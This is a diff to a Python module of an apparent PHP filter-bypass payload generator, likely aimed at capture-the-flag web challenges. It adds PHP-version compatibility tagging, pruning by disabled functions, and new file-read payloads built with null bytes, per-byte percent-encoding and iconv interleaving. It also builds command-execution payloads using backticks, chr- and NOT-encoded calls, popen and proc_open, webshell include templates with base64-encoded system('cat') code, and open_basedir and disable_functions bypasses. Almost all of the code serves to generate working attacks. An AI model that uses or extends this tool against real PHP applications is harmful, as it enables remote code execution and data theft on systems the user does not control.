@@ -1,6 +1,7 @@
 import re
+import urllib.parse
 from dataclasses import dataclass
-from typing import TYPE_CHECKING, Optional, Tuple
+from typing import TYPE_CHECKING, Callable, Optional, Tuple
 
 from . import bypass_data
 from . import tamper
@@ -18,7 +19,7 @@ class BypassOptions:
     ip: str
     port: int
     phpinfo: bool
-    php_version: float = 7.0
+    php_version: object = 7.0
     upload: bool = False
     payload_context: str = "any"
     auto_context: Optional["AutoContext"] = None
@@ -28,6 +29,46 @@ class BypassOptions:
 class PayloadRecord:
     payload: str
     techniques: Tuple[str, ...]
+    min_php: str = ""
+    max_php: str = ""
+    deprecated_from: str = ""
+    requirements: Tuple[str, ...] = ()
+    notes: Tuple[str, ...] = ()
+    compatibility_confidence: str = "generic"
+
+
+PHP_EXEC_FUNCTIONS = {"system", "passthru", "shell_exec", "exec", "popen", "proc_open"}
+FILE_READ_FUNCTIONS = {
+    "file_get_contents",
+    "readfile",
+    "highlight_file",
+    "show_source",
+    "file",
+    "fopen",
+    "splfileobject",
+}
+
+
+@dataclass(frozen=True)
+class PayloadExplanation:
+    min_php: str = ""
+    max_php: str = ""
+    deprecated_from: str = ""
+    requirements: Tuple[str, ...] = ()
+    notes: Tuple[str, ...] = ()
+    compatibility_confidence: str = "generic"
+
+
+@dataclass(frozen=True)
+class CompatibilityRule:
+    name: str
+    matcher: Callable[[str, str], bool]
+    min_php: str = ""
+    max_php: str = ""
+    deprecated_from: str = ""
+    requirements: Tuple[str, ...] = ()
+    notes: Tuple[str, ...] = ()
+    compatibility_confidence: str = "inferred"
 
 
 def _octal_encode(command: str):
@@ -259,6 +300,388 @@ def _is_eval_safe_php_payload(payload: str):
     return True
 
 
+def _php_version(options: "BypassOptions"):
+    ctx = getattr(options, "auto_context", None)
+    hinted = getattr(ctx, "php_version_tuple_hint", None)
+    if hinted:
+        return utils.parse_php_version(hinted)
+    hinted = getattr(ctx, "php_version_hint", None)
+    if hinted is not None:
+        return utils.parse_php_version(hinted)
+    return utils.parse_php_version(options.php_version)
+
+
+def _disabled_functions(options: "BypassOptions"):
+    ctx = getattr(options, "auto_context", None)
+    return {str(item or "").strip().lower() for item in getattr(ctx, "disable_functions", []) if str(item or "").strip()}
+
+
+def _payload_uses_legacy_upload_tag(payload: str):
+    lowered = payload.strip().lower()
+    return lowered.startswith("<%") or lowered.startswith("gif89a<%") or lowered.startswith(
+        '<script language="php">'
+    ) or 'gif89a<script language="php">' in lowered
+
+
+def _payload_uses_php7_expression_call(payload: str):
+    stripped = payload.strip()
+    lowered = stripped.lower()
+    return (
+        re.match(r"^\(?\s*['\"](?:system|phpinfo|exec|passthru|shell_exec|popen|proc_open)['\"]\s*\)?\s*\(", stripped, re.I)
+        is not None
+        or lowered.startswith("(~")
+    )
+
+
+def _regex_rule(pattern: str, flags=0):
+    compiled = re.compile(pattern, flags)
+    return lambda _text, lowered: compiled.search(lowered) is not None
+
+
+def _substring_rule(value: str):
+    lowered_value = value.lower()
+    return lambda _text, lowered: lowered_value in lowered
+
+
+COMPATIBILITY_CONFIDENCE_ORDER = {
+    "generic": 0,
+    "inferred": 1,
+    "contextual": 2,
+    "explicit": 3,
+    "version_sensitive": 4,
+}
+
+
+COMPATIBILITY_RULES = (
+    CompatibilityRule(
+        name="preg_replace_e",
+        matcher=lambda _text, lowered: "preg_replace('/.*/e'" in lowered
+        or re.search(r"preg_replace\s*\([^)]*/e['\"]", lowered) is not None,
+        min_php="5.6",
+        max_php="5.6",
+        notes=("preg_replace /e is removed in PHP 7",),
+        compatibility_confidence="explicit",
+    ),
+    CompatibilityRule(
+        name="create_function",
+        matcher=_substring_rule("create_function"),
+        min_php="5.6",
+        max_php="7.4",
+        deprecated_from="7.2",
+        notes=("create_function is removed in PHP 8",),
+        compatibility_confidence="explicit",
+    ),
+    CompatibilityRule(
+        name="assert_string_exec",
+        matcher=_regex_rule(r"\bassert\s*\("),
+        min_php="5.6",
+        max_php="7.4",
+        deprecated_from="7.2",
+        notes=("assert(string) no longer evaluates code in PHP 8",),
+        compatibility_confidence="inferred",
+    ),
+    CompatibilityRule(
+        name="ffi_cdef",
+        matcher=_substring_rule("ffi::cdef"),
+        min_php="7.4",
+        requirements=("FFI extension and ffi.enable",),
+        compatibility_confidence="explicit",
+    ),
+    CompatibilityRule(
+        name="pcntl_exec",
+        matcher=_substring_rule("pcntl_exec"),
+        requirements=("pcntl extension",),
+        compatibility_confidence="inferred",
+    ),
+    CompatibilityRule(
+        name="ld_preload",
+        matcher=_substring_rule("ld_preload"),
+        requirements=("LD_PRELOAD-capable mail/sendmail path",),
+        compatibility_confidence="inferred",
+    ),
+    CompatibilityRule(
+        name="imagick_msl",
+        matcher=_substring_rule("imagick("),
+        requirements=("Imagick extension with MSL/vid support",),
+        compatibility_confidence="inferred",
+    ),
+    CompatibilityRule(
+        name="open_basedir_runtime_relaxation",
+        matcher=lambda _text, lowered: "ini_set('open_basedir','..')" in lowered
+        or 'ini_set("open_basedir","..")' in lowered,
+        max_php="8.2",
+        requirements=("PHP < 8.3 runtime open_basedir relaxation",),
+        compatibility_confidence="explicit",
+    ),
+    CompatibilityRule(
+        name="php_stream_filter",
+        matcher=_substring_rule("php://filter"),
+        requirements=("PHP stream wrappers enabled",),
+        compatibility_confidence="inferred",
+    ),
+    CompatibilityRule(
+        name="php_data_wrapper",
+        matcher=_substring_rule("data://text/plain"),
+        requirements=("allow_url_include for include-style execution",),
+        compatibility_confidence="inferred",
+    ),
+    CompatibilityRule(
+        name="expect_wrapper",
+        matcher=_substring_rule("expect://"),
+        requirements=("expect extension",),
+        compatibility_confidence="inferred",
+    ),
+    CompatibilityRule(
+        name="zip_wrapper",
+        matcher=_substring_rule("zip://"),
+        requirements=("zip wrapper and controllable archive",),
+        compatibility_confidence="inferred",
+    ),
+)
+
+
+def _payload_calls_disabled_function(payload: str, disabled_functions):
+    if not disabled_functions:
+        return False
+    lowered = payload.lower()
+    if "ffi::cdef" in lowered:
+        return False
+    if "shell_exec" in disabled_functions and "`" in payload:
+        return True
+    for func in sorted(disabled_functions):
+        if not func:
+            continue
+        if re.search(rf"(?<!->)\b{re.escape(func)}\s*\(", lowered):
+            return True
+        if re.search(rf"['\"]{re.escape(func)}['\"]\s*\(", lowered):
+            return True
+        if re.search(rf"['\"]{re.escape(func)}['\"]\s*,", lowered):
+            return True
+    return False
+
+
+def _merge_min_php(current: str, incoming: str):
+    if not incoming:
+        return current
+    if not current:
+        return incoming
+    return incoming if utils.parse_php_version(incoming) > utils.parse_php_version(current) else current
+
+
+def _merge_max_php(current: str, incoming: str):
+    if not incoming:
+        return current
+    if not current:
+        return incoming
+    return incoming if utils.parse_php_version(incoming) < utils.parse_php_version(current) else current
+
+
+def _merge_deprecated_from(current: str, incoming: str):
+    if not incoming:
+        return current
+    if not current:
+        return incoming
+    return incoming if utils.parse_php_version(incoming) < utils.parse_php_version(current) else current
+
+
+def _merge_confidence(current: str, incoming: str):
+    if COMPATIBILITY_CONFIDENCE_ORDER.get(incoming, 0) > COMPATIBILITY_CONFIDENCE_ORDER.get(current, 0):
+        return incoming
+    return current
+
+
+def _append_unique(items, value: str):
+    if value and value not in items:
+        items.append(value)
+
+
+def _decoded_payload_forms(payload: str):
+    forms = [payload or ""]
+    queue = [payload or ""]
+    for _round in range(2):
+        next_queue = []
+        for value in queue:
+            for decoder in (urllib.parse.unquote, urllib.parse.unquote_plus):
+                try:
+                    decoded = decoder(value)
+                except Exception:
+                    continue
+                if decoded not in forms:
+                    forms.append(decoded)
+                    next_queue.append(decoded)
+        queue = next_queue
+    return forms
+
+
+def _has_null_byte(payload: str):
+    lowered = (payload or "").lower()
+    return "\x00" in payload or "%00" in lowered or "%2500" in lowered
+
+
+def _context_has_byte_drop_transform(auto_context):
+    preprocessors = {str(item or "").lower() for item in getattr(auto_context, "preprocessors", [])}
+    return bool({"iconv", "mb_convert_encoding"} & preprocessors)
+
+
+def _decoded_null_byte_is_interleaved_path(decoded: str):
+    if "\x00" not in decoded:
+        return False
+    # f\0l\0a\0g and /f\0l\0a\0g style payloads rely on a transform dropping
+    # inserted bytes, not historical path truncation after a complete filename.
+    return re.search(r"(?:[A-Za-z0-9._/-]\x00){2,}[A-Za-z0-9._/-]?", decoded) is not None
+
+
+def _decoded_null_byte_looks_like_legacy_truncation(decoded: str):
+    if "\x00" not in decoded:
+        return False
+    prefix, suffix = decoded.split("\x00", 1)
+    if not prefix:
+        return False
+    if _decoded_null_byte_is_interleaved_path(decoded):
+        return False
+    return suffix == "" or suffix.startswith(".") or "/" not in suffix
+
+
+def _apply_null_byte_compatibility(payload: str, payload_context: str, auto_context, state):
+    if not _has_null_byte(payload):
+        return
+
+    requirements, notes = state["requirements"], state["notes"]
+    state["compatibility_confidence"] = _merge_confidence(
+        state["compatibility_confidence"],
+        "contextual",
+    )
+
+    decoded_forms = _decoded_payload_forms(payload)
+    has_interleaved = any(_decoded_null_byte_is_interleaved_path(form) for form in decoded_forms)
+    has_legacy_truncation = any(_decoded_null_byte_looks_like_legacy_truncation(form) for form in decoded_forms)
+
+    if has_interleaved or _context_has_byte_drop_transform(auto_context):
+        _append_unique(
+            requirements,
+            "transform/preprocessor must drop or ignore inserted NUL bytes before the sink",
+        )
+        _append_unique(
+            notes,
+            "NUL-byte interleave is treated as a transform-chain bypass, not a PHP null-byte truncation primitive",
+        )
+        return
+
+    if has_legacy_truncation:
+        state["max_php"] = _merge_max_php(state["max_php"], "5.3.3")
+        state["compatibility_confidence"] = _merge_confidence(
+            state["compatibility_confidence"],
+            "version_sensitive",
+        )
+        _append_unique(requirements, "legacy null-byte path truncation")
+        _append_unique(notes, "PHP path APIs reject NUL bytes on modern PHP versions")
+        return
+
+    _append_unique(requirements, "NUL bytes must be stripped or ignored before the sink")
+    _append_unique(notes, "NUL-byte payload is context-sensitive and may fail on direct PHP file APIs")
+
+
+def describe_payload(payload: str, payload_context: str = "any", auto_context=None) -> PayloadExplanation:
+    text = payload or ""
+    lowered = text.lower()
+    state = {
+        "requirements": [],
+        "notes": [],
+        "min_php": "",
+        "max_php": "",
+        "deprecated_from": "",
+        "compatibility_confidence": "generic",
+    }
+
+    def require(value: str):
+        _append_unique(state["requirements"], value)
+
+    def note(value: str):
+        _append_unique(state["notes"], value)
+
+    if _payload_uses_legacy_upload_tag(text):
+        state["min_php"] = _merge_min_php(state["min_php"], "5.6")
+        state["max_php"] = _merge_max_php(state["max_php"], "5.6")
+        state["compatibility_confidence"] = _merge_confidence(state["compatibility_confidence"], "explicit")
+        require("PHP < 7.0 legacy ASP/script tags enabled")
+
+    for rule in COMPATIBILITY_RULES:
+        if not rule.matcher(text, lowered):
+            continue
+        state["min_php"] = _merge_min_php(state["min_php"], rule.min_php)
+        state["max_php"] = _merge_max_php(state["max_php"], rule.max_php)
+        state["deprecated_from"] = _merge_deprecated_from(
+            state["deprecated_from"],
+            rule.deprecated_from,
+        )
+        state["compatibility_confidence"] = _merge_confidence(
+            state["compatibility_confidence"],
+            rule.compatibility_confidence,
+        )
+        for item in rule.requirements:
+            require(item)
+        for item in rule.notes:
+            note(item)
+
+    if _payload_uses_php7_expression_call(text):
+        state["min_php"] = _merge_min_php(state["min_php"], "7.0")
+        state["compatibility_confidence"] = _merge_confidence(state["compatibility_confidence"], "explicit")
+    if "`" in text:
+        state["deprecated_from"] = _merge_deprecated_from(state["deprecated_from"], "8.5")
+        state["compatibility_confidence"] = _merge_confidence(state["compatibility_confidence"], "explicit")
+        require("shell_exec enabled")
+        note("backticks are equivalent to shell_exec")
+
+    _apply_null_byte_compatibility(text, payload_context, auto_context, state)
+
+    return PayloadExplanation(
+        min_php=state["min_php"],
+        max_php=state["max_php"],
+        deprecated_from=state["deprecated_from"],
+        requirements=tuple(state["requirements"]),
+        notes=tuple(state["notes"]),
+        compatibility_confidence=state["compatibility_confidence"],
+    )
+
+
+def _payload_matches_runtime(payload: str, version, disabled_functions=(), payload_context="any", auto_context=None):
+    explanation = describe_payload(payload, payload_context=payload_context, auto_context=auto_context)
+    parsed = utils.parse_php_version(version)
+    if explanation.min_php and parsed < utils.parse_php_version(explanation.min_php):
+        return False
+    if explanation.max_php and not _php_version_lte_declared_max(parsed, explanation.max_php):
+        return False
+    if _payload_calls_disabled_function(payload, disabled_functions):
+        return False
+    return True
+
+
+def _php_version_lte_declared_max(parsed_version, max_php: str):
+    parts = [part for part in str(max_php).split(".") if part != ""]
+    parsed_max = utils.parse_php_version(max_php)
+    if len(parts) <= 1:
+        return parsed_version[0] <= parsed_max[0]
+    if len(parts) == 2:
+        return parsed_version[:2] <= parsed_max[:2]
+    return parsed_version <= parsed_max
+
+
+def _filter_payloads_for_runtime(payloads, options: "BypassOptions"):
+    version = _php_version(options)
+    disabled = _disabled_functions(options)
+    return [
+        payload
+        for payload in payloads
+        if _payload_matches_runtime(
+            payload,
+            version,
+            disabled_functions=disabled,
+            payload_context=options.payload_context,
+            auto_context=options.auto_context,
+        )
+    ]
+
+
 def _normalize_payload_context(payload_context: str):
     normalized = str(payload_context or "any").strip().lower()
     if normalized in {"php", "php_eval", "php_code", "eval"}:
@@ -279,6 +702,13 @@ def _is_file_path_payload(payload: str):
         return False
     if _is_upload_wrapper_like_payload(stripped) or _is_php_style_payload(stripped):
         return False
+    if lowered.startswith("data://"):
+        return True
+    decoded_forms = [lowered]
+    try:
+        decoded_forms.append(urllib.parse.unquote_plus(stripped).lower())
+    except Exception:
+        pass
     command_prefixes = (
         "cat ",
         "tac ",
@@ -312,10 +742,10 @@ def _is_file_path_payload(payload: str):
         "bash ",
         "tar ",
     )
-    if lowered.startswith(command_prefixes):
+    if any(form.startswith(command_prefixes) for form in decoded_forms):
         return False
     shell_tokens = ("`", "$(", "${ifs}", "$ifs", "&&", "||", "|", ";")
-    if any(token in lowered for token in shell_tokens):
+    if any(token in form for form in decoded_forms for token in shell_tokens):
         return False
     if " " in stripped:
         return False
@@ -346,7 +776,7 @@ def _filter_payloads_for_context(payloads, payload_context: str):
 def _apply_upload_php_wrappers(payloads, php_version: float):
     templates = list(bypass_data.SHORT_TAG_TEMPLATES)
     templates.extend(bypass_data.UPLOAD_MODERN_WRAPPER_TEMPLATES)
-    if php_version < 7.0:
+    if utils.php_version_before(php_version, "7.0"):
         templates.extend(bypass_data.UPLOAD_LEGACY_WRAPPER_TEMPLATES)
 
     wrapped = []
@@ -486,6 +916,15 @@ def infer_payload_techniques(payload: str):
         add("tamper:uninitializedvariable")
     if "php://filter" in lowered:
         add("php_stream_filter")
+    if "%00" in lowered or "\x00" in text:
+        add("null_byte")
+    if re.search(r"(?:%[0-9a-f]{2}){2,}", lowered):
+        add("percent_byte_path")
+    if any(token in lowered for token in ("%e4", "%b8", "%af", "%e6", "%9c", "%87")) and re.search(
+        r"%[0-9a-f]{2}[A-Za-z0-9._~-]",
+        lowered,
+    ):
+        add("iconv_ignore_interleave")
     if "data://text/plain" in lowered:
         add("php_data_wrapper")
     if "getallheaders" in lowered:
@@ -519,12 +958,33 @@ def infer_payload_techniques(payload: str):
     return tuple(labels)
 
 
-def build_payload_record(payload: str):
-    return PayloadRecord(payload=payload, techniques=infer_payload_techniques(payload))
+def build_payload_record(payload: str, payload_context: str = "any", auto_context=None):
+    explanation = describe_payload(
+        payload,
+        payload_context=payload_context,
+        auto_context=auto_context,
+    )
+    return PayloadRecord(
+        payload=payload,
+        techniques=infer_payload_techniques(payload),
+        min_php=explanation.min_php,
+        max_php=explanation.max_php,
+        deprecated_from=explanation.deprecated_from,
+        requirements=explanation.requirements,
+        notes=explanation.notes,
+        compatibility_confidence=explanation.compatibility_confidence,
+    )
 
 
 def generate_candidate_records(options: BypassOptions):
-    return [build_payload_record(payload) for payload in generate_candidates(options)]
+    return [
+        build_payload_record(
+            payload,
+            payload_context=options.payload_context,
+            auto_context=options.auto_context,
+        )
+        for payload in generate_candidates(options)
+    ]
 
 
 def _append_increment_with_url(payloads, raw_payload: str):
@@ -534,15 +994,19 @@ def _append_increment_with_url(payloads, raw_payload: str):
         payloads.append(encoded_payload)
 
 
-def _generate_php_rce_payloads(command: str, php_version: float):
+def _generate_php_rce_payloads(command: str, php_version: object, disabled_functions=()):
     payloads = []
-    payloads.extend(_render_backtick_payloads(command))
+    disabled = {str(item or "").lower() for item in disabled_functions}
+    if "shell_exec" not in disabled:
+        payloads.extend(_render_backtick_payloads(command))
 
     for func in bypass_data.PHP_EXEC_WRAPPERS:
+        if func.lower() in disabled:
+            continue
         if func in {"popen", "proc_open"}:
             continue
 
-        if php_version >= 7.0:
+        if utils.php_version_at_least(php_version, "7.0"):
             not_func = utils.generate_php_not(func)
             not_arg = utils.generate_php_not(command)
             if not_func and not_arg:
@@ -560,10 +1024,10 @@ def _generate_php_rce_payloads(command: str, php_version: float):
 
         payloads.append(_build_chr_exec_payload(func, command))
 
-    if "popen" in bypass_data.PHP_EXEC_WRAPPERS:
+    if "popen" in bypass_data.PHP_EXEC_WRAPPERS and "popen" not in disabled:
         payloads.append(_build_popen_payload(command))
         payloads.append(_build_popen_chr_payload(command))
-    if "proc_open" in bypass_data.PHP_EXEC_WRAPPERS:
+    if "proc_open" in bypass_data.PHP_EXEC_WRAPPERS and "proc_open" not in disabled:
         payloads.append(_build_proc_open_payload(command))
         payloads.append(_build_proc_open_chr_payload(command))
 
@@ -645,7 +1109,7 @@ def _render_precise_webshell_payloads(options: "BypassOptions"):
     ):
         for tpl in bypass_data.AUTO_PRECISE_EVAL_TEMPLATES:
             out.append(_safe_format(tpl, key=key, path=path))
-    if ctx.sink_function in {"include", "include_once", "require", "require_once"}:
+    if ctx.sink_function in {"include", "include_once", "require", "require_once"} or ctx.sink_kind == "php_include":
         b64 = utils.base64_encode(f"<?php system('cat {path}');?>")
         for tpl in bypass_data.AUTO_PRECISE_INCLUDE_TEMPLATES:
             out.append(_safe_format(tpl, path=path, b64=b64))
@@ -656,18 +1120,92 @@ def _render_file_read_path_payloads(options: "BypassOptions"):
     ctx = options.auto_context
     if ctx is None:
         return []
-    if ctx.sink_function not in {"file_get_contents", "readfile", "highlight_file", "show_source"}:
+    if ctx.sink_function.lower() not in FILE_READ_FUNCTIONS:
         return []
     path = options.flagfile or "/flag"
     return [_safe_format(tpl, path=path) for tpl in bypass_data.AUTO_FILE_READ_PATH_TEMPLATES]
+
+
+def _is_file_read_path_auto_context(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None:
+        return False
+    return ctx.sink_function.lower() in FILE_READ_FUNCTIONS
+
+
+def _file_read_target_variants(path: str):
+    normalized = (path or "/flag").replace("\\", "/") or "/flag"
+    leaf = normalized.rsplit("/", 1)[-1]
+    variants = [normalized]
+    if leaf and leaf != normalized:
+        variants.append(leaf)
+    return utils.dedupe_preserve_order(variants)
+
+
+def _render_null_byte_file_read_payloads(options: "BypassOptions"):
+    if not _is_file_read_path_auto_context(options):
+        return []
+    out = []
+    path = options.flagfile or "/flag"
+    for target in _file_read_target_variants(path):
+        out.extend(
+            [
+                f"%00{target}%00",
+                f"{target}%00",
+                f"{target}%00.php",
+                f"{target}%2500",
+                f"{target}%2500.php",
+            ]
+        )
+    return utils.dedupe_preserve_order(out)
+
+
+def _render_url_decode_file_read_payloads(options: "BypassOptions"):
+    if not _is_file_read_path_auto_context(options):
+        return []
+    ctx = options.auto_context
+    preprocessors = {item.lower() for item in (ctx.preprocessors or [])}
+    if not {"urldecode", "rawurldecode"} & preprocessors:
+        return []
+
+    out = []
+    path = options.flagfile or "/flag"
+    for target in _file_read_target_variants(path):
+        encoded = utils.percent_encode_each_byte(target)
+        out.append(encoded)
+        out.append(utils.url_encode(encoded))
+        with_nul = encoded + "%00"
+        out.append(with_nul)
+        out.append(with_nul + ".php")
+        out.append(utils.url_encode(with_nul))
+        out.append(utils.url_encode(with_nul + ".php"))
+    return utils.dedupe_preserve_order(out)
+
+
+def _render_encoding_transform_file_read_payloads(options: "BypassOptions"):
+    if not _is_file_read_path_auto_context(options):
+        return []
+    ctx = options.auto_context
+    preprocessors = {item.lower() for item in (ctx.preprocessors or [])}
+    if not {"iconv", "mb_convert_encoding"} & preprocessors:
+        return []
+
+    path = options.flagfile or "/flag"
+    return utils.dedupe_preserve_order(
+        [
+            utils.build_iconv_ignore_interleaved_ascii_payload(target)
+            for target in _file_read_target_variants(path)
+            if target
+        ]
+    )
 
 
 def _render_php7_only_payloads(options: "BypassOptions"):
     ctx = options.auto_context
     if ctx is None:
         return []
-    version = ctx.php_version_hint if ctx.php_version_hint is not None else options.php_version
-    if version is None or version < 7.0:
+    version = _php_version(options)
+    if version < utils.parse_php_version("7.0"):
         return []
     path = options.flagfile or "/flag"
     return [_safe_format(t, path=path) for t in bypass_data.AUTO_PHP7_ONLY]
@@ -678,7 +1216,14 @@ def _render_open_basedir_payloads(options: "BypassOptions"):
     if ctx is None or not ctx.open_basedir:
         return []
     path = options.flagfile or "/flag"
-    return [_safe_format(t, path=path) for t in bypass_data.AUTO_OPEN_BASEDIR_BYPASS]
+    out = []
+    version = _php_version(options)
+    for tpl in bypass_data.AUTO_OPEN_BASEDIR_BYPASS:
+        rendered = _safe_format(tpl, path=path)
+        if "ini_set('open_basedir','..')" in rendered and version >= utils.parse_php_version("8.3"):
+            continue
+        out.append(rendered)
+    return out
 
 
 def _render_disable_fn_payloads(options: "BypassOptions"):
@@ -688,8 +1233,11 @@ def _render_disable_fn_payloads(options: "BypassOptions"):
     disabled = {d.lower() for d in ctx.disable_functions}
     path = options.flagfile or "/flag"
     out = []
+    version = _php_version(options)
     for tpl in bypass_data.AUTO_DISABLE_FN_BYPASS:
         rendered = _safe_format(tpl, path=path)
+        if "FFI::cdef" in rendered and version < utils.parse_php_version("7.4"):
+            continue
         # Skip templates that use a disabled function.
         first_call = rendered.split("(")[0].rstrip()
         first_name = first_call.rsplit(";", 1)[-1].strip().lstrip("$")
@@ -727,6 +1275,9 @@ def _generate_auto_only_candidates(options: "BypassOptions", base_candidates):
     out.extend(_render_sanitizer_aware_payloads(options))
     out.extend(_render_precise_webshell_payloads(options))
     out.extend(_render_file_read_path_payloads(options))
+    out.extend(_render_null_byte_file_read_payloads(options))
+    out.extend(_render_url_decode_file_read_payloads(options))
+    out.extend(_render_encoding_transform_file_read_payloads(options))
     out.extend(_render_php7_only_payloads(options))
     out.extend(_render_open_basedir_payloads(options))
     out.extend(_render_disable_fn_payloads(options))
@@ -737,6 +1288,8 @@ def _generate_auto_only_candidates(options: "BypassOptions", base_candidates):
 def generate_candidates(options: BypassOptions):
     payloads = []
     target_cmd = None
+    php_version = _php_version(options)
+    disabled_functions = _disabled_functions(options)
 
     root_discovery_mode = (
         options.flagfile == "/"
@@ -796,7 +1349,7 @@ def generate_candidates(options: BypassOptions):
 
     if options.phpinfo:
         for template in bypass_data.PHPINFO_TEMPLATES:
-            if template.startswith("(") and template.endswith(");") and options.php_version < 7.0:
+            if template.startswith("(") and template.endswith(");") and php_version < utils.parse_php_version("7.0"):
                 continue
             payloads.append(template)
         target_cmd = "phpinfo"
@@ -816,19 +1369,25 @@ def generate_candidates(options: BypassOptions):
                 increment_payload = f"{inc_code};$_____();"
                 _append_increment_with_url(payloads, increment_payload)
 
-            if options.php_version >= 7.0:
+            if php_version >= utils.parse_php_version("7.0"):
                 not_code = utils.generate_php_not("phpinfo")
                 payloads.append(f"{not_code}();")
 
             chr_phpinfo = utils.generate_php_chr("phpinfo")
             payloads.append(f"$_={chr_phpinfo};$_();")
         else:
-            payloads.extend(_generate_php_rce_payloads(target_cmd, options.php_version))
+            payloads.extend(
+                _generate_php_rce_payloads(
+                    target_cmd,
+                    php_version,
+                    disabled_functions=disabled_functions,
+                )
+            )
 
     if options.upload:
         raw_payloads = payloads.copy()
         shell_wrapped = _apply_upload_shell_wrappers(raw_payloads)
-        php_wrapped = _apply_upload_php_wrappers(raw_payloads, options.php_version)
+        php_wrapped = _apply_upload_php_wrappers(raw_payloads, php_version)
         existing_wrapped = [p for p in raw_payloads if _is_upload_wrapper_like_payload(p)]
         payloads = utils.dedupe_preserve_order(shell_wrapped + php_wrapped + existing_wrapped)
 
@@ -850,6 +1409,7 @@ def generate_candidates(options: BypassOptions):
 
     candidates = utils.dedupe_preserve_order(payloads)
     candidates = [payload for payload in candidates if payload != "`/`"]
+    candidates = _filter_payloads_for_runtime(candidates, options)
     return _filter_payloads_for_context(candidates, options.payload_context)
 
 
